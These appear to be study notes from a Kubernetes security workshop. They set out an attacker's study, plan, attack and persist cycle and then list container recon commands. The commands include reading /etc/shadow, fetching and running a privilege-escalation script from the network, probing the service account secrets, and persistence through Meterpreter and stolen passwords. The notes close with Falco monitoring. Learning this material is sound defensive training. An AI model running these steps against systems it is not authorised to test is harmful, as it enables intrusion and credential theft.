 #### Study
 
 For example, nmap is commonly used to enumerate IP networks. nikto, burp, and sqlmap are interesting ways to learn more about web applications. Windows and Linux administrative utilities such as uname, winver, and netstat provide a wealth of information about their host OSes.

 #### Plan

 In this phase, think about everything you currently know, and what actions you can take based on that knowledge. If you think you can do something that will help you get closer to your goal, move onto Attack. Otherwise, go back to Study and try to learn more.

 #### Attack

 In this phase, you take some action in the hope of getting closer to your goal. This may be running an exploit tool against a buggy piece of software, launching some kind of credential-guessing utility, or even just running a system command like kubectl apply. Your success or failure will teach you more about your target and situation.

 #### Persist

 take some action to make it easier to re-enter the system or network at a later time. Common options are running a malware Remote Access Tool such as Meterpreter, creating new accounts for later use, and stealing passwords.
 

 #### Env Poking

```
id

uname -a

cat /etc/lsb-release /etc/redhat-release

ps -ef

df -h

netstat -nl
```

[http://pentestmonkey.net/tools/audit/unix-privesc-check](unix privsec check)

[https://www.exploit-db.com/](Kernel exploit checks)


```
cat /etc/shadow

ls -l /home

ls -l /root

cd /tmp; curl http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard
```
That's not getting us anywhere. Let's follow-up on that idea that it's maybe a container:

```
cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained

```

Some security features are not in use (userns)

The host seems to be running the default Docker seccomp profile, restricting some key kernel calls


Inspect the Kubernetes environment

```
env | grep -i kube

curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version

ls /var/run/secrets/kubernetes.io/serviceaccount
```


```
export PATH=/tmp:$PATH
cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.16.4/bin/linux/amd64/kubectl; chmod 555 kubectl

kubectl get all

kubectl get all -A

kubectl get namespaces
```

```
kubectl get pods --all-namespaces -o jsonpath="{..image}" | tr -s '[[:space:]]' '\n' | sort -u

kubectl get pods -n prd -o jsonpath='{range .items[?(@.spec.serviceAccountName=="default")]}{.metadata.name}{" "}{.spec.serviceAccountName}{"\n"}{end}'

```

SysDig's Falco - Cluster Monitoring

```
kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security.yml

kubectl logs -n falco $(kubectl get pod -n falco -l app=falco -o=name) -f
```

#### Take Aways

Become very familiar with `jq` usage, and `jsonpath` filtering.

As well as assessing logs  and pushing monitoring into play whist confirming it's activation.


